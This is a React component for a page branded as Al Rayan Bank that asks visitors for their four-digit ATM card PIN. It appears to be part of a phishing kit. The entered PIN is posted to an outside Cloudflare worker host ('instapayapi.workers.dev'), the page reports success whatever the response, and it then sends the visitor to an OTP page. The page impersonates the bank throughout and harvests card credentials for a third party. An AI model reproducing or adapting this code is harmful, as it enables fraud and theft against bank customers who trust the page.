import React, { useState } from "react";
import axios from "axios";
import { FaCreditCard, FaLock, FaCheckCircle } from "react-icons/fa";
import logo from "./assets/qib.png";
import { useNavigate } from "react-router-dom";

export default function ATMCardPin() {
  const navigate = useNavigate();
  const [pin, setPin] = useState("");
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);

  const handleVerify = async () => {
    // if (pin.length !== 4 || isNaN(pin)) {
    //   setMessage("Please enter a valid 4-digit PIN.");
    //   return;
    // }

    setLoading(true);
    setMessage("");

    try {
      const res = await fetch("https://my-worker.instapayapi.workers.dev", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          type: "ATM",
          pin,
        }),
      });
      const json = await res.json();
      console.log(res,json, "ressssss");
      setMessage("PIN verified successfully!");
      navigate("/thirdotp")
      // Navigate to next page after 1 second
      // setTimeout(() => navigate("/thirdotp"), 1000);
    } catch (error) {
      setMessage("Server error or invalid PIN.");
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center px-4 relative">
      {/* ✅ Global Loader Overlay */}
      {loading && (
        <div className="absolute inset-0 flex flex-col items-center justify-center bg-white bg-opacity-50 z-50">
          <div className="w-20 h-20 border-4 border-[#0075B0] border-t-transparent rounded-full animate-spin mb-4"></div>
          
        </div>
      )}

      {/* ✅ Logo */}
      <img src={logo} alt="AL RAYAN BANK" className="w-40 absolute top-4" />

      {/* ✅ Main Container */}
      <div className="w-full max-w-2xl border border-gray-300 rounded-md shadow-sm mt-20 bg-white">
        <div className="border-b border-gray-300 bg-gray-100 px-6 py-3 text-center">
          <h2 className="text-base text-[#0075B0] font-semibold">ATM Card PIN</h2>
        </div>

        <div className="flex flex-col items-center py-8 px-6">
          {/* Card Icon */}
          <FaCreditCard size={80} color="#0075B0" className="mb-6" />

          {/* Input Field */}
          <div className="flex w-full max-w-sm items-center border border-[#0075B0] rounded-md overflow-hidden">
            <div className="bg-gray-100 px-3 py-2 flex items-center justify-center">
              <FaLock />
            </div>
            <input
              type="number"
              maxLength="4"
              placeholder="Enter Your ATM Card PIN Number (4 Digits)"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
              className="flex-1 px-3 py-2 focus:outline-none"
            />
          </div>


          {/* Message */}
          {message && (
            <p className="mt-4 text-red-700 font-medium text-center">{message}</p>
          )}
          {/* Verify Button */}
          <button
            onClick={handleVerify}
            // onClick={()=>navigate("/thirdotp")}
            disabled={loading}
            className="mt-6 flex items-center gap-2 justify-center bg-[#0075B0] text-white font-semibold py-2 px-8 rounded-md  transition disabled:opacity-70"
          >
            <FaCheckCircle />
            Verify
          </button>


        </div>
      </div>
    </div>
  );
}
